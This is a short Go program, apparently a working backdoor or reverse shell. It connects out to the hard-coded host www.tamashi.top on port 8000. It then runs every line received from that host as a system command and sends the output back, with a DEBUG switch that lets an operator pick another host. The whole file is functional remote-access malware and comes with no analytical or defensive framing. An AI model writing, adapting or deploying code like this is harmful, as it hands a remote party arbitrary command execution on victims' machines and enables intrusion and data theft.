package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

var DEBUG = 0

func main() {
	var service string
	if DEBUG == 1 {
		if len(os.Args) != 2 {
			log.Fatalf("Usage: %s host:port", os.Args[0])
		}
		service = os.Args[1]
	} else {
		ips, _ := net.LookupHost("www.tamashi.top")
		service = ips[0] + ":8000"
	}

	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		log.Fatal(err)
	}
	conn, err := net.DialTCP("tcp4", nil, tcpAddr)
	if err != nil {
		log.Fatal(err)
	}

	tmp := make([]byte, 256)
	for {
		n, err := conn.Read(tmp)
		if err != nil {
			if err != io.EOF {
				fmt.Println("read error:", err)
			}
			break
		}

		if n > 0 {
			println("receive: ", string(tmp))
			runCmd(conn, string(tmp[:n]))
			tmp = make([]byte, 256)
		}
	}

	log.Fatal("finish")
}

func runCmd(conn *net.TCPConn, _cmd_str string) {
	_cmd_slice := strings.Split(_cmd_str, " ")
	var cmd *exec.Cmd
	if len(_cmd_slice) < 2 {
		println("args length invalid", _cmd_str)
		cmd = exec.Command(_cmd_slice[0], _cmd_slice[1:]...)
	} else {
		cmd = exec.Command(_cmd_slice[0], _cmd_slice[1:]...)
	}
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Println("cmd.Run() failed with %s\n", err)
		return
	}
	outStr, errStr := string(stdout.Bytes()), string(stderr.Bytes())
	fmt.Printf("out:\n%s\nerr:\n%s\n", outStr, errStr)
	conn.Write([]byte(outStr + errStr))
}
